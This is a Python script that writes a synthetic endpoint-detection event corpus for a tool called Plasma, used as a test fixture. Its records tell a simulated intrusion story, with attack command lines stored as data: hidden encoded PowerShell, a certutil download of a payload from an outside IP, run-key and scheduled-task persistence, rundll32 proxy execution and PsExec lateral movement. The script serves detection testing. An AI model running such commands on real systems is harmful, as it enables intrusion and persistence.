"""Generate a deterministic normalized EDR event corpus for Plasma.

The corpus models what the Plasma normalizer writes on an endpoint: one JSON
object per line, every field present (null where not applicable). It is the
data the frozen neuralOS instance is profiled from, and the fixture the test
suite runs against.

Usage:  python tools/gen_samples.py [--out samples/plasma_events.jsonl]
"""
from __future__ import annotations

import argparse
import json
import os

FIELDS = [
    "ts", "host", "source", "kind", "event_id", "severity", "user",
    "process", "pid", "ppid", "parent", "image", "cmdline",
    "dest_ip", "dest_port", "dns_query", "file_path", "registry_path",
    "technique", "alert_id", "score", "action", "description",
]


def ev(**kw):
    row = {f: None for f in FIELDS}
    row.update(kw)
    return row


def build():
    rows = []

    # --- normal baseline activity -------------------------------------------
    rows += [
        ev(ts="2026-10-16T08:00:11Z", host="WS1", source="sysmon", kind="process",
           event_id=1, severity="info", user="CORP\\olu", process="explorer.exe",
           pid=3200, ppid=812, parent="userinit.exe",
           image="C:\\Windows\\explorer.exe", cmdline="C:\\Windows\\explorer.exe",
           description="Interactive shell started"),
        ev(ts="2026-10-16T08:00:42Z", host="WS1", source="sysmon", kind="process",
           event_id=1, severity="info", user="CORP\\olu", process="outlook.exe",
           pid=4412, ppid=3200, parent="explorer.exe",
           image="C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
           cmdline="OUTLOOK.EXE", description="Mail client started"),
        ev(ts="2026-10-16T08:01:05Z", host="WS1", source="sysmon", kind="network",
           event_id=3, severity="info", user="CORP\\olu", process="outlook.exe",
           pid=4412, ppid=3200, parent="explorer.exe",
           dest_ip="52.3.242.251", dest_port=443, description="TLS session to mail"),
        ev(ts="2026-10-16T08:01:06Z", host="WS1", source="sysmon", kind="dns",
           event_id=22, severity="info", user="CORP\\olu", process="outlook.exe",
           pid=4412, ppid=3200, parent="explorer.exe",
           dns_query="outlook.office365.com", description="DNS lookup"),
        ev(ts="2026-10-16T08:02:20Z", host="WS2", source="sysmon", kind="process",
           event_id=1, severity="info", user="CORP\\svcbackup", process="backup.exe",
           pid=5120, ppid=640, parent="services.exe",
           image="C:\\Program Files\\Backup\\backup.exe",
           cmdline="backup.exe --daily", description="Scheduled backup"),
        ev(ts="2026-10-16T08:02:31Z", host="WS2", source="sysmon", kind="file",
           event_id=11, severity="info", user="CORP\\svcbackup", process="backup.exe",
           pid=5120, ppid=640, parent="services.exe",
           file_path="D:\\Backups\\daily-20261016.bak", description="Backup archive written"),
        ev(ts="2026-10-16T08:03:10Z", host="DC1", source="sysmon", kind="auth",
           event_id=4624, severity="info", user="CORP\\olu", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           description="Interactive logon type 2"),
        ev(ts="2026-10-16T08:03:12Z", host="DC1", source="sysmon", kind="auth",
           event_id=4672, severity="info", user="CORP\\olu", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           description="Special privileges assigned to new logon"),
    ]

    # --- suspicious process chain on WS1 (the alert story) ------------------
    rows += [
        ev(ts="2026-10-16T09:14:03Z", host="WS1", source="sysmon", kind="process",
           event_id=1, severity="high", user="CORP\\olu", process="powershell.exe",
           pid=4832, ppid=3200, parent="explorer.exe",
           image="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
           cmdline="powershell.exe -nop -w hidden -enc SQBFAFgA",
           technique="T1059.001", description="PowerShell spawned with encoded command"),
        ev(ts="2026-10-16T09:14:05Z", host="WS1", source="sysmon", kind="network",
           event_id=3, severity="medium", user="CORP\\olu", process="powershell.exe",
           pid=4832, ppid=3200, parent="explorer.exe",
           dest_ip="185.220.101.4", dest_port=4444,
           technique="T1071.001", description="Outbound TCP to non-standard port"),
        ev(ts="2026-10-16T09:14:06Z", host="WS1", source="sysmon", kind="dns",
           event_id=22, severity="medium", user="CORP\\olu", process="powershell.exe",
           pid=4832, ppid=3200, parent="explorer.exe",
           dns_query="cdn-sync.bad-c2.example", technique="T1071.004",
           description="DNS query to low-reputation domain"),
        ev(ts="2026-10-16T09:14:21Z", host="WS1", source="sysmon", kind="process",
           event_id=1, severity="high", user="CORP\\olu", process="certutil.exe",
           pid=4908, ppid=4832, parent="powershell.exe",
           image="C:\\Windows\\System32\\certutil.exe",
           cmdline="certutil.exe -urlcache -f http://185.220.101.4/payload.exe C:\\Users\\Public\\p.exe",
           technique="T1105", description="LOLBin download of remote payload"),
        ev(ts="2026-10-16T09:14:22Z", host="WS1", source="sysmon", kind="file",
           event_id=11, severity="high", user="CORP\\olu", process="certutil.exe",
           pid=4908, ppid=4832, parent="powershell.exe",
           file_path="C:\\Users\\Public\\p.exe", technique="T1105",
           description="Executable written to public directory"),
        ev(ts="2026-10-16T09:14:30Z", host="WS1", source="sysmon", kind="process",
           event_id=1, severity="critical", user="CORP\\olu", process="p.exe",
           pid=5011, ppid=4908, parent="certutil.exe",
           image="C:\\Users\\Public\\p.exe",
           cmdline="C:\\Users\\Public\\p.exe --stage2",
           technique="T1204.002", description="Downloaded payload executed"),
        ev(ts="2026-10-16T09:14:31Z", host="WS1", source="sysmon", kind="image_load",
           event_id=7, severity="high", user="CORP\\olu", process="p.exe",
           pid=5011, ppid=4908, parent="certutil.exe",
           file_path="C:\\Users\\Public\\stage2.dll", technique="T1055",
           description="Unsigned image loaded from user-writable path"),
        ev(ts="2026-10-16T09:14:33Z", host="WS1", source="sentinel", kind="alert",
           event_id=9001, severity="critical", user="CORP\\olu", process="p.exe",
           pid=5011, ppid=4908, parent="certutil.exe",
           alert_id="SEN-1001", score=0.97, action="killed",
           technique="T1059.001", description="Sentinel Tier1: encoded PowerShell chain"),
        ev(ts="2026-10-16T09:14:34Z", host="WS1", source="sentinel", kind="alert",
           event_id=9002, severity="high", user="CORP\\olu", process="p.exe",
           pid=5011, ppid=4908, parent="certutil.exe",
           alert_id="SEN-1002", score=0.91, action="logged",
           technique="T1105", description="Sentinel Tier2: ingress tool transfer"),
    ]

    # --- persistence attempts ------------------------------------------------
    rows += [
        ev(ts="2026-10-16T09:20:11Z", host="WS1", source="sysmon", kind="registry",
           event_id=13, severity="high", user="CORP\\olu", process="p.exe",
           pid=5011, ppid=4908, parent="certutil.exe",
           registry_path="HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\PlasmaTest",
           technique="T1547.001", description="Run-key persistence written"),
        ev(ts="2026-10-16T09:20:15Z", host="WS2", source="sysmon", kind="registry",
           event_id=13, severity="medium", user="CORP\\svcbackup", process="cmd.exe",
           pid=5222, ppid=5120, parent="backup.exe",
           registry_path="HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe",
           technique="T1546.008", description="IFEO debugger hijack attempt"),
        ev(ts="2026-10-16T09:21:02Z", host="WS2", source="sysmon", kind="process",
           event_id=1, severity="high", user="CORP\\svcbackup", process="schtasks.exe",
           pid=5231, ppid=5222, parent="cmd.exe",
           image="C:\\Windows\\System32\\schtasks.exe",
           cmdline="schtasks /create /tn Updater /tr C:\\Users\\Public\\p.exe /sc minute",
           technique="T1053.005", description="Scheduled task persistence"),
        ev(ts="2026-10-16T09:21:10Z", host="WS2", source="sentinel", kind="alert",
           event_id=9003, severity="high", user="CORP\\svcbackup", process="schtasks.exe",
           pid=5231, ppid=5222, parent="cmd.exe",
           alert_id="SEN-1003", score=0.88, action="logged",
           technique="T1053.005", description="Sentinel Tier2: scheduled task creation"),
    ]

    # --- credential access / brute force ------------------------------------
    rows += [
        ev(ts="2026-10-16T02:11:05Z", host="WS1", source="sysmon", kind="auth",
           event_id=4625, severity="medium", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="95.142.115.12", technique="T1110.001",
           description="Failed logon, bad password"),
        ev(ts="2026-10-16T02:11:09Z", host="WS1", source="sysmon", kind="auth",
           event_id=4625, severity="medium", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="95.142.115.12", technique="T1110.001",
           description="Failed logon, bad password"),
        ev(ts="2026-10-16T02:11:12Z", host="WS1", source="sysmon", kind="auth",
           event_id=4625, severity="medium", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="95.142.115.12", technique="T1110.001",
           description="Failed logon, bad password"),
        ev(ts="2026-10-16T02:11:15Z", host="WS1", source="sysmon", kind="auth",
           event_id=4625, severity="medium", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="95.142.115.12", technique="T1110.001",
           description="Failed logon, bad password"),
        ev(ts="2026-10-16T02:11:18Z", host="WS1", source="sysmon", kind="auth",
           event_id=4625, severity="medium", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="95.142.115.12", technique="T1110.001",
           description="Failed logon, bad password"),
        ev(ts="2026-10-16T02:11:22Z", host="WS1", source="sysmon", kind="auth",
           event_id=4625, severity="medium", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="95.142.115.12", technique="T1110.001",
           description="Failed logon, bad password"),
        ev(ts="2026-10-16T02:12:01Z", host="DC1", source="sysmon", kind="auth",
           event_id=4624, severity="high", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="95.142.115.12", technique="T1078.002",
           description="Network logon type 3 from external address"),
        ev(ts="2026-10-16T02:13:40Z", host="DC1", source="sentinel", kind="alert",
           event_id=9004, severity="critical", user="Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           alert_id="SEN-1004", score=0.95, action="logged",
           technique="T1110", description="Sentinel Tier1: credential brute force"),
        ev(ts="2026-10-16T02:14:05Z", host="WS2", source="sysmon", kind="process",
           event_id=1, severity="critical", user="CORP\\svcbackup", process="rundll32.exe",
           pid=5310, ppid=5231, parent="schtasks.exe",
           image="C:\\Windows\\System32\\rundll32.exe",
           cmdline="rundll32.exe C:\\Users\\Public\\stage2.dll,Start",
           technique="T1218.011", description="Proxy execution via rundll32"),
        ev(ts="2026-10-16T02:14:09Z", host="WS2", source="sentinel", kind="alert",
           event_id=9005, severity="critical", user="CORP\\svcbackup", process="rundll32.exe",
           pid=5310, ppid=5231, parent="schtasks.exe",
           alert_id="SEN-1005", score=0.99, action="killed",
           technique="T1218.011", description="Sentinel Tier1: proxy execution killed"),
    ]

    # --- lateral movement ----------------------------------------------------
    rows += [
        ev(ts="2026-10-16T02:20:01Z", host="WS2", source="sysmon", kind="auth",
           event_id=4624, severity="high", user="CORP\\Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           dest_ip="10.0.0.21", technique="T1021.002",
           description="Logon type 3 from WS1"),
        ev(ts="2026-10-16T02:20:05Z", host="WS2", source="sysmon", kind="process",
           event_id=1, severity="high", user="CORP\\Administrator", process="psexesvc.exe",
           pid=5401, ppid=640, parent="services.exe",
           image="C:\\Windows\\PSEXESVC.exe",
           cmdline="C:\\Windows\\PSEXESVC.exe", technique="T1021.002",
           description="Remote service execution"),
        ev(ts="2026-10-16T02:20:08Z", host="WS2", source="sysmon", kind="network",
           event_id=3, severity="high", user="CORP\\Administrator", process="psexesvc.exe",
           pid=5401, ppid=640, parent="services.exe",
           dest_ip="10.0.0.20", dest_port=445, technique="T1021.002",
           description="SMB connection back to source host"),
        ev(ts="2026-10-16T02:21:00Z", host="DC1", source="sentinel", kind="alert",
           event_id=9006, severity="critical", user="CORP\\Administrator", process="lsass.exe",
           pid=720, ppid=520, parent="wininit.exe",
           alert_id="SEN-1006", score=0.93, action="logged",
           technique="T1021.002", description="Sentinel Tier1: lateral movement pattern"),
    ]

    # --- benign noise across hosts ------------------------------------------
    noise = [
        ("WS1", "chrome.exe", 4500, 3200, "explorer.exe", "network", "52.3.242.251", 443, None, None, None, "info"),
        ("WS1", "chrome.exe", 4500, 3200, "explorer.exe", "dns", None, None, "www.google.com", None, None, "info"),
        ("WS1", "svchost.exe", 1120, 640, "services.exe", "network", "52.3.242.251", 443, None, None, None, "info"),
        ("WS2", "mmc.exe", 6100, 3200, "explorer.exe", "process", None, None, None, None, None, "info"),
        ("WS2", "notepad.exe", 6104, 6100, "mmc.exe", "process", None, None, None, None, None, "info"),
        ("DC1", "dns.exe", 2088, 640, "services.exe", "dns", None, None, "corp.local", None, None, "info"),
        ("DC1", "lsass.exe", 720, 520, "wininit.exe", "auth", None, None, None, None, None, "info"),
    ]
    t = 10
    for i in range(72):
        host, proc, pid, ppid, parent, kind, dip, dport, dns, fpath, reg, sev = noise[i % len(noise)]
        minute = t + i
        rows.append(ev(
            ts=f"2026-10-16T{10 + minute // 60:02d}:{minute % 60:02d}:{i % 60:02d}Z",
            host=host, source="sysmon", kind=kind,
            event_id={"process": 1, "network": 3, "dns": 22, "auth": 4624, "file": 11, "registry": 13}.get(kind, 1),
            severity=sev,
            user="CORP\\olu" if host != "WS2" else "CORP\\svcbackup",
            process=proc, pid=pid, ppid=ppid, parent=parent,
            image=None if not proc.endswith(".exe") else f"C:\\Windows\\{proc}",
            cmdline=None, dest_ip=dip, dest_port=dport, dns_query=dns,
            file_path=fpath, registry_path=reg,
            description=f"Routine {kind} activity",
        ))

    return rows


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out", default=os.path.join(os.path.dirname(__file__), "..", "samples", "plasma_events.jsonl"))
    a = ap.parse_args()
    rows = build()
    os.makedirs(os.path.dirname(os.path.abspath(a.out)), exist_ok=True)
    with open(a.out, "w", encoding="utf-8") as fh:
        for r in rows:
            fh.write(json.dumps(r, separators=(",", ":")) + "\n")
    print(f"wrote {len(rows)} events -> {os.path.abspath(a.out)}")


if __name__ == "__main__":
    main()
